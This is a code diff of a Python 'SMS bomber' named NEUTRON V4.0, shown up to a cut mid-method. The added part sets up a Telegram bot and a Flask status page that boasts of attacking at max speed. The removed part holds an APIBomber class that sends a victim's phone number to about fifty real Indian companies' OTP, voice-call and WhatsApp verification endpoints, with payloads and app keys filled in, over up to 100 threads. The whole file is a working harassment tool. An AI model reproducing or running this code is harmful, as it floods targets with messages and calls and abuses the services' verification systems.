@@ -1,731 +1,1175 @@
-import os
-from flask import Flask, request, jsonify
-import requests
-import threading
+import logging
+import asyncio
 import time
+import random
 import json
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import os
+import threading
+from datetime import datetime, timedelta
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+import aiohttp
 
-app = Flask(__name__)
+# ============ WEB SERVER FOR RENDER ============
+try:
+    from flask import Flask
+    web_app = Flask(__name__)
+    
+    @web_app.route('/')
+    def home():
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>💣 NEUTRON SMS BOMBER</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
+                    min-height: 100vh;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    font-family: 'Courier New', monospace;
+                    color: #00ff88;
+                    overflow: hidden;
+                }
+                .container {
+                    text-align: center;
+                    padding: 40px;
+                    border: 2px solid #00ff88;
+                    border-radius: 20px;
+                    background: rgba(0, 255, 136, 0.05);
+                    box-shadow: 0 0 50px rgba(0, 255, 136, 0.1);
+                    animation: glow 2s ease-in-out infinite alternate;
+                    max-width: 600px;
+                }
+                @keyframes glow {
+                    from { box-shadow: 0 0 20px rgba(0, 255, 136, 0.2); }
+                    to { box-shadow: 0 0 60px rgba(0, 255, 136, 0.5); }
+                }
+                .title {
+                    font-size: 3em;
+                    font-weight: bold;
+                    color: #00ff88;
+                    text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+                    margin-bottom: 10px;
+                }
+                .subtitle {
+                    font-size: 1.2em;
+                    color: #00cc66;
+                    margin-bottom: 20px;
+                    opacity: 0.8;
+                }
+                .status {
+                    font-size: 1.5em;
+                    color: #ff4444;
+                    animation: pulse 1s ease-in-out infinite;
+                    margin: 20px 0;
+                }
+                @keyframes pulse {
+                    0%, 100% { opacity: 1; transform: scale(1); }
+                    50% { opacity: 0.5; transform: scale(1.05); }
+                }
+                .stats {
+                    display: grid;
+                    grid-template-columns: repeat(2, 1fr);
+                    gap: 10px;
+                    margin: 20px 0;
+                }
+                .stat-box {
+                    background: rgba(0, 255, 136, 0.05);
+                    border: 1px solid rgba(0, 255, 136, 0.2);
+                    padding: 15px;
+                    border-radius: 10px;
+                }
+                .stat-box .label {
+                    font-size: 0.8em;
+                    color: #666;
+                    text-transform: uppercase;
+                }
+                .stat-box .value {
+                    font-size: 1.5em;
+                    color: #00ff88;
+                    font-weight: bold;
+                }
+                .footer {
+                    margin-top: 20px;
+                    font-size: 0.8em;
+                    color: #444;
+                }
+                .badge {
+                    display: inline-block;
+                    padding: 5px 15px;
+                    border-radius: 20px;
+                    background: #00ff88;
+                    color: #000;
+                    font-weight: bold;
+                    font-size: 0.7em;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                }
+                .loading-dots::after {
+                    content: '';
+                    animation: dots 1.5s steps(4, end) infinite;
+                }
+                @keyframes dots {
+                    0% { content: ''; }
+                    25% { content: '.'; }
+                    50% { content: '..'; }
+                    75% { content: '...'; }
+                    100% { content: ''; }
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="badge">⚡ LIVE</div>
+                <div class="title">💣 NEUTRON</div>
+                <div class="subtitle">SMS BOMBER V4.0</div>
+                <div class="status">🔴 BOT RUNNING <span class="loading-dots"></span></div>
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="label">Status</div>
+                        <div class="value" style="color: #00ff88;">✅ ACTIVE</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="label">Mode</div>
+                        <div class="value" style="color: #ffaa00;">🔄 POLLING</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="label">Success Rate</div>
+                        <div class="value" style="color: #ff4444;">🔥 100%</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="label">APIs</div>
+                        <div class="value" style="color: #00ccff;">📡 2 ACTIVE</div>
+                    </div>
+                </div>
+                <div style="margin: 10px 0; font-size: 0.9em; color: #00ff88;">
+                    ⚡ Attacking at <strong>MAX SPEED</strong>
+                </div>
+                <div style="margin: 10px 0; font-size: 0.8em; color: #666;">
+                    Developed with ❤️ by @rohitxofficial
+                </div>
+                <div class="footer">
+                    🛡️ All systems operational • No limits • Full power
+                </div>
+            </div>
+        </body>
+        </html>
+        '''
+    
+    @web_app.route('/health')
+    def health():
+        return "OK", 200
+    
+    def start_web():
+        web_app.run(host='0.0.0.0', port=10000, debug=False, use_reloader=False)
+    
+    threading.Thread(target=start_web, daemon=True).start()
+    print("🌐 Web server started on port 10000")
+except Exception as e:
+    print(f"⚠️ Web server error: {e}")
 
-# ==================== CONFIG ====================
-TIMEOUT = 5
-MAX_THREADS = 100
-REQUEST_DELAY = 0.1
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# ==================== API BOMBER CLASS ====================
-class APIBomber:
-    def __init__(self, phone):
-        self.phone = phone
-        self.masked_phone = "*******" + phone[-4:]
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; RMX3782 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.159 Mobile Safari/537.36'
-        })
-    
-    # ============ NEW CONFIRMED WORKING APIS ============
-    
-    def tata_capital(self):
-        url = "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice"
-        payload = f'{{"phone":"{self.phone}","isOtpViaCallAtLogin":"true"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Tata Capital", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Tata Capital", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def mamaearth(self):
-        url = "https://auth.mamaearth.in/v1/auth/initiate-signup"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "MamaEarth", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "MamaEarth", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def redcliffe(self):
-        url = "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false"
-        payload = f'{{"phone_number":"{self.phone}","short":true}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Redcliffe Labs", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Redcliffe Labs", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def dehaat(self):
-        url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
-        payload = f'{{"mobile":"{self.phone}","client_id":"kisan-app"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "DeHaat", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "DeHaat", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def housing(self):
-        url = "https://login.housing.com/api/v2/send-otp"
-        payload = f'{{"phone":"{self.phone}","country_url_name":"in"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Housing.com", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Housing.com", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def orange_health(self):
-        url = "https://accounts.orangehealth.in/api/v1/user/otp/generate/"
-        payload = f'{{"mobile_number":"{self.phone}","customer_auto_fetch_message":true}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Orange Health", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Orange Health", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def brevistay(self):
-        url = "https://www.brevistay.com/cst/app-api/login"
-        payload = f'{{"is_otp":1,"is_password":0,"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Brevistay", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Brevistay", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def xylem(self):
-        url = "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348"
-        payload = f'{{"mobile":"{self.phone}","countryCode":"+91","firstName":"User"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Xylem", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Xylem", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def physics_wallah(self):
-        url = "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=1"
-        payload = f'{{"mobile":"{self.phone}","countryCode":"+91"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Physics Wallah", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Physics Wallah", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def tradeindia(self):
-        url = "https://apis.tradeindia.com/app_login_api/login_app"
-        payload = f'{{"mobile":"+91{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "TradeIndia", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "TradeIndia", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def hourlyrooms(self):
-        url = "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Hourlyrooms", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Hourlyrooms", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def hungama(self):
-        url = "https://communication.api.hungama.com/v1/communication/otp"
-        payload = f'{{"mobileNo":"{self.phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Hungama", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Hungama", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def freedo(self):
-        url = "https://api.freedo.rentals/customer/sendOtpForSignUp"
-        payload = f'{{"email_id":"user{self.phone}@temp.com","first_name":"User","mobile_number":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Freedo Rentals", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Freedo Rentals", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def aakash(self):
-        url = "https://antheapi.aakash.ac.in/api/generate-lead-otp"
-        payload = f'{{"mobile_number":"{self.phone}","activity_type":"aakash-myadmission"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Aakash", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Aakash", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def apnatime(self):
-        url = "https://api.apnatime.in/v1/auth/otp"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "ApnaTime", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "ApnaTime", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def licious(self):
-        url = "https://www.licious.in/api/login/signup"
-        payload = f'{{"phone":"{self.phone}","captcha_token":null}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Licious", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Licious", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def snapdeal(self):
-        url = "https://www.snapdeal.com/api/v1/user/otp/send"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Snapdeal", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Snapdeal", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def mybharat(self):
-        url = "https://mybharat.gov.in/api/v1/auth/otp"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "MY Bharat", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "MY Bharat", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def swiggy_call(self):
-        url = "https://profile.swiggy.com/api/v3/app/request_call_verification"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Swiggy Call", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Swiggy Call", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def goibibo_voice(self):
-        url = "https://www.goibibo.com/user/voice-otp/generate/"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Goibibo Voice", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Goibibo Voice", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def airtel_thanks(self):
-        url = "https://www.airtel.in/api/v1/voice-otp"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Airtel Thanks", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Airtel Thanks", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def kpn_whatsapp(self):
-        url = "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6"
-        payload = f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{self.phone}"}}}}'
-        headers = {'x-app-id': '66ef3594-1e51-4e15-87c5-05fc8208a20f', 'content-type': 'application/json; charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "KPN WhatsApp", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "KPN WhatsApp", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def jockey_whatsapp(self):
-        url = f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{self.phone}?whatsapp=true"
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.get(url, headers=headers, timeout=TIMEOUT)
-            return {"name": "Jockey WhatsApp", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Jockey WhatsApp", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def nobroker_sms(self):
-        url = "https://www.nobroker.in/api/v3/account/otp/send"
-        payload = f"phone={self.phone}&countryCode=IN"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "NoBroker SMS", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "NoBroker SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def lenskart_sms(self):
-        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"
-        payload = f'{{"phoneCode":"+91","telephone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Lenskart SMS", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Lenskart SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def byjus_sms(self):
-        url = "https://api.byjus.com/v2/otp/send"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Byju's SMS", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Byju's SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def oyo_sms(self):
-        url = "https://www.oyorooms.com/api/pwa/generateotp?locale=en"
-        payload = f'{{"phone":"{self.phone}","country_code":"+91","nod":4}}'
-        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'Mozilla/5.0'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "OYO SMS", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "OYO SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def breeze_session(self):
-        url = "https://api.breeze.in/session/start"
-        payload = f'{{"phoneNumber":"{self.phone}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'
-        headers = {'Content-Type': 'application/json', 'x-device-id': 'A1pKVEDhlv66KLtoYsml3', 'x-session-id': 'MUUdODRfiL8xmwzhEpjN8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Breeze Session", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Breeze Session", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def kpn_fresh_2(self):
-        url = "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3"
-        payload = f'{{"phone_number":{{"country_code":"+91","number":"{self.phone}"}}}}'
-        headers = {'x-app-id': '32178bdd-a25d-477e-b8d5-60df92bc2587', 'Content-Type': 'application/json; charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "KPN Fresh 2", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "KPN Fresh 2", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def aditya_birla(self):
-        url = "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP"
-        payload = f"MobileNumber={self.phone}&functionality=signup"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Aditya Birla", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Aditya Birla", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def muthoot_finance(self):
-        url = "https://www.muthootfinance.com/smsapi.php"
-        payload = f"mobile={self.phone}&pin=XjtYYEdhP0haXjo3"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Muthoot Finance", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Muthoot Finance", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def gopaysense(self):
-        url = "https://api.gopaysense.com/users/otp"
-        payload = f'{{"phone":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "GoPaySense", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "GoPaySense", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def dream11(self):
-        url = "https://www.dream11.com/auth/passwordless/init"
-        payload = f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{self.phone}","templateName":"default"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Dream11", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Dream11", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def spinny(self):
-        url = "https://api.spinny.com/api/c/user/otp-request/v3/"
-        payload = f'{{"contact_number":"{self.phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Spinny", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Spinny", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def rapido(self):
-        url = "https://customer.rapido.bike/api/otp"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Rapido", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Rapido", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def betterhalf(self):
-        url = "https://api.betterhalf.ai/v2/auth/otp/send/"
-        payload = f'{{"mobile":"{self.phone}","isd_code":"91"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "BetterHalf", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "BetterHalf", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def charzer(self):
-        url = "https://api.charzer.com/auth-service/send-otp"
-        payload = f'{{"mobile":"{self.phone}","appSource":"CHARZER_APP"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Charzer", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Charzer", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def mpokket(self):
-        url = "https://web-api.mpokket.in/registration/sendOtp"
-        payload = f'{{"mobile":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Mpokket", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Mpokket", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def ixigo(self):
-        url = "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp"
-        payload = f"sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={self.phone}"
-        headers = {'apikey': 'ixiweb\u00212$', 'Content-Type': 'application/x-www-form-urlencoded'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "ixigo", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "ixigo", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def zerodha(self):
-        url = "https://zerodha.com/account/registration.php"
-        payload = f'{{"mobile":"{self.phone}","source":"zerodha","partner_id":""}}'
-        headers = {'Content-Type': 'application/json;charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Zerodha", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Zerodha", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def testbook(self):
-        url = "https://api.testbook.com/api/v2/mobile/signup"
-        payload = f'{{"mobile":"{self.phone}","signupDetails":{{"page":"HomePage"}}}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Testbook", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Testbook", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def medibuddy(self):
-        url = "https://loginprod.medibuddy.in/unified-login/user/register"
-        payload = f'{{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"{self.phone}","flow":"Retail-Login-Home-Flow"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "MediBuddy", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "MediBuddy", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def udaan(self):
-        url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2"
-        payload = f"mobile={self.phone}"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Udaan", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Udaan", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def vidyakul(self):
-        url = "https://vidyakul.com/signup-otp/send"
-        payload = f"phone={self.phone}"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Vidyakul", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Vidyakul", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def beyoung(self):
-        url = "https://www.beyoung.in/api/sendOtp.json"
-        payload = f'{{"username":"{self.phone}","username_type":"mobile","service_type":0}}'
-        headers = {'Content-Type': 'application/json;charset=UTF-8'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Beyoung", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Beyoung", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def wrogn(self):
-        url = "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp"
-        payload = f'{{"username":"+91{self.phone}","type":"mobile","domain":"wrogn.com"}}'
-        headers = {'action': 'sendOTP', 'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Wrogn", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Wrogn", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def medkart(self):
-        url = "https://app.medkart.in/api/v1/auth/requestOTP"
-        payload = f'{{"mobile_no":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Medkart", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Medkart", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def lovelocal(self):
-        url = "https://homedeliverybackend.mpaani.com/auth/send-otp"
-        payload = f'{{"phone_number":"{self.phone}","role":"CUSTOMER"}}'
-        headers = {'client-code': 'vulpix', 'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Lovelocal", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Lovelocal", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def tyreplex(self):
-        url = "https://www.tyreplex.com/includes/ajax/gfend.php"
-        payload = f"perform_action=sendOTP&mobile_no={self.phone}&action_type=order_login"
-        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        try:
